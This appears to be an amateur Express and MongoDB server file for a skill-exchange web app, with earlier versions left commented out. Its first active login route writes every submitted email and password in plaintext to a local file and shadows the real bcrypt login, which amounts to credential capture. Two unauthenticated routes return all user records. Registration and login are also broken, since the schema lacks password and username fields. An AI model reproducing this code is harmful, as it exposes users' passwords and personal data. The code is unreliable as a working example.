// const express = require('express')
// const http = require('http')
// const fs = require('fs')
// const path = require('path')
// const app = express()
// const port = process.env.PORT || 9000

// app.listen(port,() => {
//     console.log(`App is being listend at ${port}`);
// })

// app.use(express.static(__dirname));

// app.get('/home',(req,res,next) =>{
//     res.sendFile(path.join(__dirname,'index.html'))
// })

// app.get('/login', (req,res,next) =>{
//     res.sendFile(path.join(__dirname,'login.html'))
// })

// app.get('/signup',(req,res,next) =>{
//     res.sendFile(path.join(__dirname,'signup.html'))
// })

// home.js (inside frontend/)

// const express = require('express');
// const bodyParser = require('body-parser');
// const mongoose = require('mongoose');
// const bcrypt = require('bcryptjs');
// const app = express();
// const port = 3000;

// // Middleware
// app.use(bodyParser.urlencoded({ extended: true }));
// app.use(express.static(__dirname)); // To serve CSS and HTML from frontend
// app.set('view engine', 'html');

// // MongoDB Setup
// mongoose.connect('mongodb://127.0.0.1:27017/skillExchangeDB', {
//     useNewUrlParser: true,
//     useUnifiedTopology: true,
// });

// // User schema
// const userSchema = new mongoose.Schema({
//     username: String,
//     email: String,
//     password: String,
// });

// const User = mongoose.model('User', userSchema);

// // Routes
// app.get('/', (req, res) => {
//     res.sendFile(__dirname + "/index.html");
// });

// app.get('/login', (req, res) => {
//     res.sendFile(__dirname + "/login.html");
// });

// app.get('/signup', (req, res) => {
//     res.sendFile(__dirname + "/signup.html");
// });

// app.post('/register', async (req, res) => {
//     const { username, email, password } = req.body;

//     const existingUser = await User.findOne({ email });
//     if (existingUser) {
//         return res.send("User already exists");
//     }

//     const hashedPassword = await bcrypt.hash(password, 10);
//     const newUser = new User({ username, email, password: hashedPassword });
//     await newUser.save();
//     res.send("Registration Successful! Now login.");
// });

// app.post('/login', async (req, res) => {
//     const { email, password } = req.body;

//     const user = await User.findOne({ email });
//     if (!user) return res.send("User not found");

//     const isPasswordValid = await bcrypt.compare(password, user.password);
//     if (!isPasswordValid) return res.send("Incorrect password");

//     res.send("Login successful");
// });

// app.listen(port, () => {
//     console.log(`Server running at http://localhost:${port}`);
// });


// app.post('/login', async (req, res) => {
//     const { us_em, pswd } = req.body;

//     try {
//         const user = await User.findOne({ us_em });

//         if (!user) {
//             return res.send('User not found');
//         }

//         const isMatch = await bcrypt.compare(pswd, user.pswd);

//         if (!isMatch) {
//             return res.send('Incorrect password');
//         }

//         // ✅ Successful login
//         res.redirect('/index.html');  // This will redirect to your home page

//     } catch (err) {
//         console.error(err);
//         res.status(500).send('Server error');
//     }
// });

// // Skill model (create this at the top or in a separate file)
// // const mongoose = require('mongoose');

// const skillSchema = new mongoose.Schema({
//   offer: String,
//   learn: String,
// });

// const Skill = mongoose.model('Skill', skillSchema);

// // POST route to store skill
// app.post('/skills', async (req, res) => {
//   const { offer, learn } = req.body;
//   await Skill.create({ offer, learn });
//   res.redirect('/skills.html'); // Reloads with new data
// });

// // GET route to list all skills
// app.get('/skills', async (req, res) => {
//   const skills = await Skill.find();
//   res.json(skills);
// });


const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 3000;

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));


app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Create string to write
  const userData = `Email: ${email}, Password: ${password}\n`;

  // Save to loginData.txt (append for multiple logins)
  const filePath = path.join(__dirname, 'loginData.txt');

  fs.appendFile(filePath, userData, (err) => {
    if (err) {
      console.error('❌ Error saving user login:', err);
      return res.status(500).send('Server error while saving login.');
    }

    console.log('✅ Login saved to file');
    // res.send('<h1>Login data stored successfully 👍😁</h1>');
    res.redirect('afterlogin.html');
  });
});


// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files like HTML/CSS/JS

// MongoDB Setup
mongoose.connect('mongodb://127.0.0.1:27017/skillExchangeDB', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

// User Schema and Model
const userSchema = new mongoose.Schema({
    fname: String,
    lname: String,
    email: String,
    phone: String,
    skillOffer: String,
    skillLevel: String,
    skillNeed: String,
    filePath: String
});

const User = mongoose.model('User', userSchema);

// Skill Schema and Model
const skillSchema = new mongoose.Schema({
    offer: String,
    learn: String,
});

const Skill = mongoose.model('Skill', skillSchema);

// -------------------- ROUTES --------------------

// Home Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Signup Page
app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'signup.html'));
});

// Login Page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Register User
app.post('/register', async (req, res) => {
    const { username, email, password } = req.body;

    try {
        const existingUser = await User.findOne({ email });

        if (existingUser) {
            return res.send('❌ User already exists');
        }

        const hashedPassword = await bcrypt.hash(password, 10);
        const newUser = new User({ username, email, password: hashedPassword });
        await newUser.save();

        res.send('✅ Registration successful! You can now log in.');
    } catch (err) {
        console.error(err);
        res.status(500).send('❌ Server error during registration');
    }
});

// Login User
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log('Login attempt:', email);

    try {
        const user = await User.findOne({ email });

        if (!user) {
            return res.send('❌ User not found');
        }

        const isMatch = await bcrypt.compare(password, user.password);

        if (!isMatch) {
            return res.send('❌ Incorrect password');
        }

        // ✅ Successful login
        res.send(`✅ Welcome back, ${user.username}! Login successful.`);
        // Optionally: res.redirect('/dashboard.html');

    } catch (err) {
        console.error(err);
        res.status(500).send('❌ Server error during login');
    }
});

// Post a skill
app.post('/skills', async (req, res) => {
    const { offer, learn } = req.body;

    try {
        await Skill.create({ offer, learn });
        res.redirect('/skills.html');
    } catch (err) {
        console.error(err);
        res.status(500).send('❌ Error saving skill');
    }
});

// Get all skills
app.get('/skills', async (req, res) => {
    try {
        const skills = await Skill.find();
        res.json(skills);
    } catch (err) {
        console.error(err);
        res.status(500).send('❌ Error fetching skills');
    }
});

app.get('/check-users', async (req, res) => {
    try {
        const users = await User.find();  // Find all users
        res.json(users);  // Send the users as a response
    } catch (err) {
        res.status(500).send('❌ Error fetching users');
    }
});

// Match skills based on what user needs
app.get('/matches/:userId', async (req, res) => {
    const userId = req.params.userId;

    try {
        const currentUser = await User.findById(userId);

        if (!currentUser) {
            return res.status(404).send('❌ User not found');
        }

        const neededSkill = currentUser.skillNeed;

        // Find users who offer the skill this user wants
        const matches = await User.find({
            skillOffer: neededSkill,
            _id: { $ne: currentUser._id }
        });

        if (matches.length === 0) {
            return res.send('😞 No matches found for your skill need.');
        }

        res.json(matches);
    } catch (err) {
        console.error(err);
        res.status(500).send('❌ Server error while matching skills');
    }
});

app.get('/seed-users', async (req, res) => {
    try {
      const dummyUsers = [
        {
          fname: "Alice",
          lname: "Walker",
          email: "alice@example.com",
          phone: "1234567890",
          skillOffer: "Graphic Design",
          skillLevel: "Advanced",
          skillNeed: "Web Development",
        },
        {
          fname: "Bob",
          lname: "Smith",
          email: "bob@example.com",
          phone: "9876543210",
          skillOffer: "Web Development",
          skillLevel: "Intermediate",
          skillNeed: "Graphic Design",
        },
        {
          fname: "Charlie",
          lname: "Brown",
          email: "charlie@example.com",
          phone: "4445556666",
          skillOffer: "Content Writing",
          skillLevel: "Beginner",
          skillNeed: "Video Editing",
        },
        {
          fname: "David",
          lname: "Johnson",
          email: "david@example.com",
          phone: "3334445555",
          skillOffer: "Video Editing",
          skillLevel: "Advanced",
          skillNeed: "Content Writing",
        }
      ];
  
      await User.insertMany(dummyUsers);
      res.send("✅ Dummy users seeded successfully.");
    } catch (err) {
      console.error('❌ Error seeding users:', err);
      res.status(500).send("❌ Failed to seed dummy users.");
    }
  });

  app.get('/all-users', async (req, res) => {
    const users = await User.find();
    res.json(users);
  });
  

// Start Server
app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
});
